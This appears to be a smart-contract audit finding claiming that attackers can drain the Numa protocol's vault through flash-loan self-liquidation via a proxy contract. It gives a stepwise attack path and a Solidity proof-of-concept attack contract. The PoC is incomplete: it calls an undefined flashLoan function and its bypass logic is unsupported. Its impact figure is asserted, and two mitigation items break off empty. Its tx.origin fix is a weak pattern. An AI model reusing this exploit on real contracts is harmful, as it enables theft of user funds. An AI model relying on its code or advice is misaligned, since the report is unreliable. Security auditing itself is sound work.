# Malicious actors will drain protocol funds through flash loan self-liquidations

### Summary

Missing validation checks in liquidation functions will cause loss of funds for the protocol as malicious actors will exploit flash loans combined with self-liquidation through proxy contracts to extract excess value during high collateral factor periods.

### Root Cause

- In [NumaVault.sol:456](https://github.com/sherlock-audit/2024-12-numa-audit/commit/37e4e56293e20fb0220a06eec425dd0986c4fecf) the notBorrower modifier only checks msg.sender
- In [NumaVault.sol:482-485](https://github.com/sherlock-audit/2024-12-numa-audit/commit/37e4e56293e20fb0220a06eec425dd0986c4fecf) the liquidation function allows flash loans without checking tx.origin

### Internal pre-conditions

1. Admin needs to set CollateralFactorMantissa to be at least 0.75 (75%) in NumaComptroller
2. Amount of LST tokens in vault needs to be at least equal to liquidation amount
3. Flash loan parameter needs to be set to true in liquidation functions

### External pre-conditions

1. Uniswap LST/ETH pool needs to have at least 100k USD in liquidity
2. Gas price needs to be less than 100 gwei to make attack profitable

### Attack Path

1. Attacker deploys proxy contract
2. Attacker takes flash loan of LST tokens through proxy
3. Attacker opens leveraged position using flash loaned tokens
4. Attacker triggers self-liquidation through proxy contract, bypassing [NumaVault.sol:456](https://github.com/sherlock-audit/2024-12-numa-audit/commit/37e4e56293e20fb0220a06eec425dd0986c4fecf)
5. Attacker extracts excess value through price manipulation using [NumaVault.sol:482-485](https://github.com/sherlock-audit/2024-12-numa-audit/commit/37e4e56293e20fb0220a06eec425dd0986c4fecf)
6. Attacker repays flash loan with profit

### Impact

The protocol suffers a loss of 10-15% of collateral value per successful attack. The attacker gains this percentage of the collateral minus flash loan fees and gas costs.

### PoC

contract AttackContract {
    INumaVault vault;
    IERC20 lstToken;
    
    function attack() external {
        // Flash loan LST tokens
        uint256 loanAmount = 1000e18;  
        bytes memory params = abi.encode(msg.sender);
        flashLoan(loanAmount, params);
    }

    function executeOperation(
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        // Open leveraged position
        lstToken.approve(address(vault), amount);
        vault.buy(amount, 0, address(this));
        
        // Self-liquidate through proxy
        vault.liquidateNumaBorrower(
            initiator,  // Original borrower - bypasses notBorrower check
            amount,     
            true,      // Swap to input token
            true       // Use flash loan
        );

        // Repay flash loan with profit
        lstToken.transfer(msg.sender, amount + premium);
        return true;
    }
}

### Mitigation

1. Update notBorrower modifier to check tx.origin in [NumaVault.sol:456](https://github.com/sherlock-audit/2024-12-numa-audit/commit/37e4e56293e20fb0220a06eec425dd0986c4fecf):

2. Add liquidation cooldown period check in [NumaVault.sol:482](https://github.com/sherlock-audit/2024-12-numa-audit/commit/37e4e56293e20fb0220a06eec425dd0986c4fecf):

3. Add stricter validation around flash loan usage in [NumaVault.sol:482-485](https://github.com/sherlock-audit/2024-12-numa-audit/commit/37e4e56293e20fb0220a06eec425dd0986c4fecf)
